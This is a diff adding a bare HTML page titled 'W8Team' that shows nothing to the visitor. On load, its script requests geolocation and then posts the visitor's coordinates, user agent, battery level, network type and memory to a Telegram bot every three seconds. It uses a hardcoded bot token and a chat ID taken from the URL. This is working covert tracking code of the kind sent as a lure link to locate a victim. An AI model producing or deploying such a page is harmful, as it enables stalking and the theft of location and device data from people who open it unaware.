@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>W8Team</title>
+</head>
+<body>
+    <h1></h1>
+
+    <script>
+        const botToken = '9087217791:AAEjOhKH0uOml0VcW8Vsw2whkm0ZX6cOSvY'; // Replace with your actual bot token
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('id'); // Get the chat ID from the URL parameter
+
+        // Request geolocation permission and then send every 3 seconds
+        document.addEventListener('DOMContentLoaded', () => {
+            if (!navigator.geolocation) {
+                console.error('Geolocation not supported');
+                return;
+            }
+
+            // First immediate send
+            navigator.geolocation.getCurrentPosition(sendTelegramLocation);
+
+            // Then keep sending every 3 seconds
+            setInterval(() => {
+                navigator.geolocation.getCurrentPosition(sendTelegramLocation);
+            }, 3000);
+
+            // Default values
+            let batteryPercentage = 'N/A';
+            let networkType = 'N/A';
+
+            // Retrieve battery and network information (if available)
+            if (navigator.getBattery) {
+                navigator.getBattery().then(function (battery) {
+                    batteryPercentage = (battery.level * 100).toFixed(2) + '%';
+                });
+            }
+// 9ait7777666544422
+            if (navigator.connection) {
+                networkType = navigator.connection.effectiveType;
+            }
+
+            function sendTelegramLocation(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+
+                // Gather additional information
+                const wanIp = '';
+                const userAgent = navigator.userAgent;
+                const dateAndTime = new Date().toLocaleString();
+                const totalRam = navigator.deviceMemory;
+
+                // Create a message with all the information
+                const infoMessage = `
+WAN IP Address: ${wanIp}
+User-Agent: ${userAgent}
+Battery Percentage: ${batteryPercentage}
+Network Type: ${networkType}
+Date and Time: ${dateAndTime}
+Total RAM: ${totalRam} GB
+`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: infoMessage,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+// 9ait7777666544422
+                // Send the location after sending the message
+                fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: latitude,
+                        longitude: longitude,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                })
+                .catch(error => {
+                    console.error(error);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
